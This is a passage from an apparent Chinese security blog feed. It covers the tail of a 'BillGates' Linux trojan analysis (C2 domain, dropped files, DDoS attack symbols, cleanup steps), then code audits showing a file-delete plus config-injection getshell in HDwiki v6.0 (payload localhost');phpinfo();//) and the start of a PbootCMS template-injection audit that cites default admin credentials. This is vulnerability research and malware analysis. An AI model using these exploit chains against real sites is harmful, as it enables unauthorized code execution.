class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">Network Communication:</span><br><span class="line"></span><br><span class="line">DNS Resolutions:</span><br><span class="line">fuck999.site</span><br><span class="line"></span><br><span class="line">IP Traffic:</span><br><span class="line"></span><br><span class="line">216.58.203.46:6001 (TCP)</span><br><span class="line">8.8.8.8:53 (UDP)</span><br><span class="line"></span><br><span class="line">File System Actions:</span><br><span class="line"></span><br><span class="line">Files Opened:</span><br><span class="line"></span><br><span class="line">/dev/null</span><br><span class="line">/tmp/gates.lod</span><br><span class="line"></span><br><span class="line">Files Written:</span><br><span class="line"></span><br><span class="line">/tmp/gates.lod</span><br><span class="line"></span><br><span class="line">Process And Service Actions:</span><br><span class="line"></span><br><span class="line">Processes Created:</span><br><span class="line"></span><br><span class="line">/tmp/EB93A6/996E.elf</span><br><span class="line">Processes Terminated</span><br><span class="line">/tmp/EB93A6/996E.elf</span><br><span class="line">/lib/systemd/systemd-udevd --daemon</span><br><span class="line"></span><br><span class="line">Highlighted Actions:</span><br><span class="line"></span><br><span class="line">Highlighted Text:</span><br><span class="line"></span><br><span class="line">11CAttackBase</span><br><span class="line">13CPacketAttack</span><br><span class="line">10CAttackUdp</span><br><span class="line">10CAttackSyn</span><br><span class="line">11CAttackIcmp</span><br><span class="line">10CAttackDns</span><br><span class="line">10CAttackAmp</span><br><span class="line">10CAttackPrx</span><br><span class="line">15CAttackCompress</span><br><span class="line">10CTcpAttack</span><br><span class="line">9CAttackCc</span><br><span class="line">10CAttackTns</span><br><span class="line">9CAttackIe</span><br><span class="line">Attack.cpp</span><br><span class="line">_ZTV10CAttackUdp</span><br><span class="line">_ZN9CAttackIe4StopEv</span><br><span class="line">_ZTV10CAttackAmp</span><br><span class="line">_ZTI9CAttackCc</span><br><span class="line">_ZTV9CAttackIe</span><br><span class="line">_ZN10CAttackAmpC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZN13CPacketAttackD1Ev</span><br><span class="line">_ZN10CAttackDns10MakePacketEj</span><br><span class="line">_ZTV9CAttackCc</span><br><span class="line">_ZN9CAttackCc2DoEj</span><br><span class="line">_ZN14CThreadAtkCtrl10StopAttackEv</span><br><span class="line">_ZTS15CAttackCompress</span><br><span class="line">_ZTV10CAttackDns</span><br><span class="line">_ZN10CAttackTns16UpdateCurVariantEj</span><br><span class="line">_ZN10CAttackSyn10MakePacketEj</span><br><span class="line">_ZN23CThreadKernelAtkExcutor10StopAttackEv</span><br><span class="line">_ZN11CAttackBaseD2Ev</span><br><span class="line">_ZTS10CAttackAmp</span><br><span class="line">_ZTI10CAttackAmp</span><br><span class="line">_ZTS10CAttackUdp</span><br><span class="line">_ZN11CAttackIcmpC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZN10CAttackPrx10MakePacketEj</span><br><span class="line">_ZTS11CAttackIcmp</span><br><span class="line">_ZN10CAttackUdpD1Ev</span><br><span class="line">_ZN11CAttackIcmp10MakePacketEj</span><br><span class="line">_ZN10CAttackUdpC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZTI11CAttackIcmp</span><br><span class="line">_ZTI10CAttackUdp</span><br><span class="line">_ZN13CPacketAttack6CreateEv</span><br><span class="line">_ZTV13CPacketAttack</span><br><span class="line">_ZN13CPacketAttack7DestroyEv</span><br><span class="line">_ZN10CAttackAmp10MakePacketEj</span><br><span class="line">_ZTI10CAttackPrx</span><br><span class="line">_ZN13CPacketAttack20GetSockTypebyAtkTypeEh</span><br><span class="line">_ZTV11CAttackBase</span><br><span class="line">_ZN10CAttackPrxC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZN11CAttackIcmpD1Ev</span><br><span class="line">_ZN10CAttackSynD1Ev</span><br><span class="line">_ZN23CThreadNormalAtkExcutor10StopAttackEv</span><br><span class="line">_ZN9CAttackCcD0Ev</span><br><span class="line">_ZN10CAttackUdp10MakePacketEj</span><br><span class="line">_ZN13CPacketAttack14BuildUdpHeaderEPcjjttij</span><br><span class="line">_ZN9CAttackIeD0Ev</span><br><span class="line">_ZTV10CAttackTns</span><br><span class="line">_ZN9CAttackCc4StopEv</span><br><span class="line">_ZTI10CAttackDns</span><br><span class="line">_ZN13CPacketAttackD0Ev</span><br><span class="line">_ZTI10CAttackSyn</span><br><span class="line">_ZN10CTcpAttack6CreateEv</span><br><span class="line">_ZN13CPacketAttack15BuildIcmpHeaderEPcjjij</span><br><span class="line">_ZN11CAttackIcmpD0Ev</span><br><span class="line">_ZN15CAttackCompressD1Ev</span><br><span class="line">_ZN10CAttackDnsD1Ev</span><br><span class="line">_ZN10CAttackDns6CreateEv</span><br><span class="line">_ZN13CPacketAttack10SendPacketEv</span><br><span class="line">_ZN10CAttackPrxD0Ev</span><br><span class="line">_ZTV10CTcpAttack</span><br><span class="line">_ZTV15CAttackCompress</span><br><span class="line">_ZN13CPacketAttackC2EbR8CSubTaskR7CConfig</span><br><span class="line">_ZN10CAttackSynC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZN9CAttackCcD1Ev</span><br><span class="line">_ZN10CAttackAmpD1Ev</span><br><span class="line">_ZN10CAttackPrxD1Ev</span><br><span class="line">_ZN13CPacketAttack4StopEv</span><br><span class="line">_ZN10CAttackAmpD0Ev</span><br><span class="line">_ZTS13CPacketAttack</span><br><span class="line">_ZN10CAttackPrx6CreateEv</span><br><span class="line">_ZN10CTcpAttackD0Ev</span><br><span class="line">_ZTI10CAttackTns</span><br><span class="line">_ZN10CAttackDnsD0Ev</span><br><span class="line">_ZN15CAttackCompress10MakePacketEj</span><br><span class="line">_ZN9CAttackIe16UpdateCurVariantEj</span><br><span class="line">_ZN9CAttackCc6CreateEv</span><br><span class="line">_ZN10CTcpAttack4StopEv</span><br><span class="line">_ZN15CAttackCompressC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZTS10CTcpAttack</span><br><span class="line">_ZN15CAttackCompressD0Ev</span><br><span class="line">_ZTI10CTcpAttack</span><br><span class="line">_ZN10CAttackTnsD1Ev</span><br><span class="line">_ZN13CPacketAttack14BuildTcpHeaderEPchjjttij</span><br><span class="line">_ZTI11CAttackBase</span><br><span class="line">_ZTS9CAttackIe</span><br><span class="line">_ZN9CAttackCc16UpdateCurVariantEj</span><br><span class="line">_ZN10CTcpAttack7DestroyEv</span><br><span class="line">_ZN9CAttackIe2DoEj</span><br><span class="line">_ZN10CTcpAttack16UpdateCurVariantEj</span><br><span class="line">_ZN10CTcpAttackD1Ev</span><br><span class="line">_ZN10CAttackSynD0Ev</span><br><span class="line">_ZN10CAttackTns6CreateEv</span><br><span class="line">_ZTS9CAttackCc</span><br><span class="line">_ZN10CTcpAttack2DoEj</span><br><span class="line">_ZTI9CAttackIe</span><br><span class="line">_ZN10CAttackUdpD0Ev</span><br><span class="line">_ZN13CPacketAttack2DoEj</span><br><span class="line">_ZTV11CAttackIcmp</span><br><span class="line">_ZN10CAttackTnsD0Ev</span><br><span class="line">_ZN10CAttackDnsC1EbR8CSubTaskR7CConfig</span><br><span class="line">_ZTV10CAttackPrx</span><br><span class="line">_ZN9CAttackIe7DestroyEv</span><br><span class="line">_ZTV10CAttackSyn</span><br><span class="line">_ZN10CAttackTnsC1ER8CSubTask</span><br><span class="line">_ZN10CAttackTns7DestroyEv</span><br><span class="line">_ZN15CAttackCompress6CreateEv</span><br><span class="line">_ZN9CAttackCc7DestroyEv</span><br><span class="line">_ZTS10CAttackTns</span><br><span class="line">_ZN10CAttackAmp6CreateEv</span><br><span class="line">_ZN10CAttackTns4StopEv</span><br><span class="line">_ZN9CAttackIeD1Ev</span><br><span class="line">_ZN9CAttackIeC1ER8CSubTask</span><br><span class="line">_ZTS10CAttackDns</span><br><span class="line">_ZN11CAttackBaseD0Ev</span><br><span class="line">_ZN11CAttackBaseC2Ev</span><br><span class="line">_ZTI15CAttackCompress</span><br><span class="line">_ZTI13CPacketAttack</span><br><span class="line">_ZN13CPacketAttack15BuildDnsPayloadEPcbPKcitbtbj</span><br><span class="line">_ZN9CAttackIe6CreateEv</span><br><span class="line">_ZN10CAttackTns2DoEj</span><br><span class="line">_ZTS10CAttackSyn</span><br><span class="line">_ZTS11CAttackBase</span><br><span class="line">_ZN15CAttackCompress13CreatePacketsEv</span><br><span class="line">_ZN11CAttackBaseD1Ev</span><br><span class="line">_ZN13CPacketAttackD2Ev</span><br><span class="line">_ZN13CPacketAttack16UpdateCurVariantEj</span><br><span class="line">_ZN10CTcpAttackC1ER8CSubTask</span><br><span class="line">_ZN9CAttackCcC1ER8CSubTask</span><br><span class="line">_ZTS10CAttackPrx</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>服务器大扫除</p><p>删掉自启动任务、删除<code>/usr/bin/keudl</code>、<code>/usr/bin/aher</code>、<code>/etc/sysxlj</code>、<code>/etc/jourxlv</code>.</p><p>删除了以上东西后，重启发现服务器正常许多，但是如果还是没效果的话，可能是木马替换了系统的命令，多处存在备份，因此需要详细的排查。最好就是做好系统备份或快照，发现异常可查看hash值还是否相同，<code>diff</code> 查看修改内容。如果实在没办法，或者服务器没什么内容的话，安全起见重装系统，加强系统的防护，经常排查漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;早上老大，发来一个任务，说联系下某服务器负责人，看下服务器什么情况。&lt;/p&gt;
&lt;h1 id=&quot;经过&quot;&gt;&lt;a href=&quot;#经过&quot; class</summary>
      
    
    
    
    
    <category term="BillGates" scheme="https://cr4ckm3.top/tags/BillGates/"/>
    
    <category term="木马分析" scheme="https://cr4ckm3.top/tags/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HDwiki v6.0 后台 getshell</title>
    <link href="https://cr4ckm3.top/2018/04/25/HDwiki_v6.0_%E5%90%8E%E5%8F%B0getshell/"/>
    <id>https://cr4ckm3.top/2018/04/25/HDwiki_v6.0_%E5%90%8E%E5%8F%B0getshell/</id>
    <published>2018-04-25T14:37:54.000Z</published>
    <updated>2019-08-30T10:00:42.023Z</updated>
    
    <content type="html"><![CDATA[<ul><li>一篇没什么技术含量的代码审计，只是记录下笔记做个好习惯，学习有时候回头看看以前的思路发现问题亦是一种进步。</li></ul><span id="more"></span><h1 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h1><p>文件定位：<code>control/admin_filemanager.php</code>第<code>156-172</code>行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除文件或文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dodelete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;currentdir&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;fname&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$fname</span>=<span class="keyword">string</span>::hstripslashes(<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;currentdir&#x27;</span>]).<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$fname</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;view-&gt;lang[<span class="string">&#x27;file_not_exist&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;isdir&#x27;</span>]== <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">@unlink(<span class="variable">$fname</span>);</span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$fname</span>).<span class="keyword">$this</span>-&gt;view-&gt;lang[<span class="string">&#x27;file_delete_success&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;post[<span class="string">&#x27;isdir&#x27;</span>] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_ENV</span>[<span class="string">&#x27;dir&#x27;</span>]-&gt;dir_delete(<span class="variable">$fname</span>);</span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$fname</span>).<span class="string">&quot;:&quot;</span>.<span class="keyword">$this</span>-&gt;view-&gt;lang[<span class="string">&#x27;dir_delete_success&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只判断post是否设置了参数<code>currentdir</code>和<code>fname</code>，以及判断是否存在文件，未对路径进行限制就进行了删除操作。</p><p>因此可直接删除<code>data/install.lock</code>文件。</p><p>找到利用<code>control/admin_filemanager.php</code>的地方进行删除操作：</p><p><img src="/image/hdwiki/delfile.png" alt="dodelete"></p><ul><li>结果：</li></ul><p><img src="/image/hdwiki/delfile2.png" alt="dodelete2"></p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>文件定位：<code>install/install.php</code>第<code>288-308</code>行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line"><span class="variable">$saveconfig</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;saveconfig&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$saveconfig</span>==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line"><span class="comment">//db parameter</span></span><br><span class="line"><span class="variable">$dbhost</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;dbhost&#x27;</span>]);</span><br><span class="line"><span class="variable">$dbuser</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;dbuser&#x27;</span>]);</span><br><span class="line"><span class="variable">$dbpassword</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;dbpassword&#x27;</span>]);</span><br><span class="line"><span class="variable">$dbname</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"><span class="variable">$table_prefix</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;table_prefix&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接受到的内容写入CONFIG 文件，用于回显</span></span><br><span class="line"><span class="keyword">if</span> (is_writeable(<span class="variable">$configfile</span>) || (!file_exists(<span class="variable">$configfile</span>))) &#123;</span><br><span class="line"><span class="variable">$configcontent</span> = <span class="string">&quot;&lt;?php</span></span><br><span class="line"><span class="string">define(&#x27;DB_HOST&#x27;, &#x27;&quot;</span>.<span class="variable">$dbhost</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;DB_USER&#x27;, &#x27;&quot;</span>.<span class="variable">$dbuser</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;DB_PW&#x27;, &#x27;&quot;</span>.<span class="variable">$dbpassword</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;DB_NAME&#x27;, &#x27;&quot;</span>.<span class="variable">$dbname</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;DB_TABLEPRE&#x27;, &#x27;&quot;</span>.<span class="variable">$table_prefix</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;WIKI_URL&#x27;, &#x27;&quot;</span>.<span class="variable">$site_url</span>.<span class="string">&quot;&#x27;);</span></span><br><span class="line"><span class="string">?&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中对<code>$dbhost</code>等的赋值只是简单的用了<code>trim()</code>函数。然后就定义了个常量写入了<code>config.php</code>。</p><p>再看<code>config.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_PW&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wiki&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_TABLEPRE&#x27;</span>, <span class="string">&#x27;wiki_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_CONNECT&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;WIKI_FOUNDER&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;WIKI_CHARSET&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;WIKI_URL&#x27;</span>, <span class="string">&#x27;http://127.0.0.1/hdwiki/v6.0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>构造POC</li></ul><p><img src="/image/hdwiki/poc.png" alt="poc"></p><p>在数据库服务器处，我们可以构造：<code>localhost&#39;);phpinfo();//</code>即可。</p><ul><li>结果</li></ul><p>访问<code>config.php</code>:</p><p><img src="/image/hdwiki/getshell.png" alt="getshell"></p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;一篇没什么技术含量的代码审计，只是记录下笔记做个好习惯，学习有时候回头看看以前的思路发现问题亦是一种进步。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="代码审计" scheme="https://cr4ckm3.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CMS" scheme="https://cr4ckm3.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>PbootCMS v0.9.8 后台 Getshell</title>
    <link href="https://cr4ckm3.top/2018/04/11/pbootcms/"/>
    <id>https://cr4ckm3.top/2018/04/11/pbootcms/</id>
    <published>2018-04-11T15:50:00.000Z</published>
    <updated>2019-08-30T10:00:41.103Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PBOOT CMS!想伱所想,让一切皆有可能!</span><br><span class="line"></span><br><span class="line">PBOOT CMS!为伱所想,让一切皆有可能!</span><br><span class="line"></span><br><span class="line">PBOOT CMS!做伱所想,让一切皆有可能!</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>php代码审计的初学者，所以就先从D类CMS入手。</p><p>后台默认账号：<code>admin</code> 密码：<code>123456</code></p><p>代码审计分：</p><ul><li>危险函数追踪流</li><li>通读全文流</li><li>黑白盒结合审计流</li></ul><h1 id="开发者标签手册"><a href="#开发者标签手册" class="headerlink" title="开发者标签手册"></a>开发者标签手册</h1><h2 id="IF条件语句"><a href="#IF条件语句" class="headerlink" title="IF条件语句"></a>IF条件语句</h2><ul><li><code>注意：条件语句中字符串需要用单引号或双引号，条件也可以使用原生PHP代码； 所有对其它标签的调用都为字符串，需要加单引号。</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">&#x27;a&#x27;</span>==<span class="string">&#x27;b&#x27;</span>)&#125;</span><br><span class="line">内容<span class="number">1</span></span><br><span class="line">&#123;<span class="keyword">else</span>&#125;</span><br><span class="line">内容<span class="number">2</span></span><br><span class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>示例一：在IF中使用PHP函数示例：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(date(<span class="string">&#x27;Y&#x27;</span>)==<span class="number">2018</span>)&#125;<span class="number">2018</span>年&#123;/pboot:<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure><ul><li><p>示例二：高亮栏目示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">dl</span>&gt;</span></span><br><span class="line"><span class="class">     &lt;<span class="title">dt</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;</span>&#123;pboot:sitepath&#125;/<span class="string">&quot; &#123;pboot:if(0==&#x27;&#123;sort:scode&#125;&#x27;)&#125;class=&#x27;active&#x27;&#123;/pboot:if&#125;&gt;首页&lt;/a&gt;&lt;/dt&gt;</span></span><br><span class="line"><span class="string">&lt;/dl&gt;</span></span><br><span class="line"><span class="string">&#123;pboot:nav parent=0&#125;</span></span><br><span class="line"><span class="string">&lt;dl&gt;</span></span><br><span class="line"><span class="string">&lt;dt&gt;&lt;a href=&quot;</span>[nav:link]<span class="string">&quot; &#123;pboot:if(&#x27;[nav:scode]&#x27;==&#x27;&#123;sort:tcode&#125;&#x27;)&#125;class=&#x27;active&#x27;&#123;/pboot:if&#125;&gt;[nav:name]&lt;/a&gt;&lt;/dt&gt;</span></span><br><span class="line"><span class="string">&lt;dd&gt;</span></span><br><span class="line"><span class="string">&#123;pboot:2nav parent=[nav:scode]&#125;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;</span>[<span class="number">2</span>nav:link]<span class="string">&quot;  &#123;pboot:if(&#x27;[2nav:scode]&#x27;==&#x27;&#123;sort:scode&#125;&#x27;)&#125;class=&#x27;active&#x27;&#123;/pboot:if&#125;&gt;[2nav:name]&lt;/a&gt; |</span></span><br><span class="line"><span class="string">&#123;/pboot:2nav&#125;</span></span><br><span class="line"><span class="string">&lt;/dd&gt;</span></span><br><span class="line"><span class="string">&lt;/dl&gt;</span></span><br><span class="line"><span class="string">&#123;/pboot:nav&#125;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>示例三：嵌套IF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">&#x27;a&#x27;</span>==<span class="string">&#x27;b&#x27;</span>)&#125;</span><br><span class="line">&#123;pboot:<span class="number">2</span><span class="keyword">if</span>(<span class="string">&#x27;a&#x27;</span>==<span class="string">&#x27;b&#x27;</span>)&#125;</span><br><span class="line">内容<span class="number">1</span></span><br><span class="line">&#123;<span class="number">2</span><span class="keyword">else</span>&#125;</span><br><span class="line">内容<span class="number">2</span></span><br><span class="line">&#123;/pboot:<span class="number">2</span><span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">else</span>&#125;</span><br><span class="line">内容<span class="number">3</span></span><br><span class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里说了可执行PHP语句，但要插在<code>IF条件标签</code>，例如：</p><p><code>&#123;pboot:if(php语句)&#125; &#123;/pboot:if&#125;</code></p><p>然后再返回文件查看源代码文件：</p><p>该文件是：标签解析引擎控制器，也就是解析标签的。</p><p>代码的<code>1273~1314</code>为关于IF条件语句的。</p><p><code>/apps/home/controller/ParserController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析IF条件标签</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span 